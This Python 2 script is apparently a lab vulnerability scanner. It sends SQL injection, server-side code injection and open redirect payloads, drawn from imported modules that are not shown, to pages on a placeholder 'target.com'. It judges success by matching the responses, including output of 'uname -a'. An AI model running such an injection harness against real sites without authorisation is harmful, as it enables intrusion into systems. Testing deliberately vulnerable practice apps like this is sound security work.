import requests
import ssci
import oRedirect 
import re
import sqli

BASE_URL = "http://target.com/"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"

def injectPayload(url, paramname, method, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = ""	
	
	#if get
	if method == "GET":
		getURL = parsedURL + "?" + paramname+"="+payload[0]
		content = requests.get(getURL)
		html =  content.text

	#if post
	elif method == "POST":
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text

	result = checkSuccess(html, payload[1], content, verbose)
	
	#if function returns:

	if result is not None:
		print payload
		return payload

def checkSuccess(html, attackType, content, v=False):
	if v == True:
		print html

	# if asstackType == shell_command:
	# 	match = 

	if attackType == sql_injection:
		match = re.findall(r'<p>.+', html)
		if len(match) ==0 :
			return None
		return match

	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == "https://status.github.com/messages":
			return True

	#server side injection:
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + "index.php")
		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if "GNU/Linux" in html:
			return attackType

	return None;
	

if __name__ == "__main__":
	#sqli
	url = "/sqli/sqli.php"
	payloads = sqli.get_all()
	for payload in payloads:
		injectPayload(url, "username", "POST", payload)



	#Test for server side code injection
	'''
	url = "/serverside/eval2.php"
	payloads = ssci.get_all(url)
	for payload in payloads:
		injectPayload(url, "page", "GET", payload)
	'''
	#test for open redirect
	url = "/openredirect/openredirect.php"
	orPayload = oRedirect.get_all()
	for payload in orPayload:
		injectPayload(url, "redirect", "GET", payload)
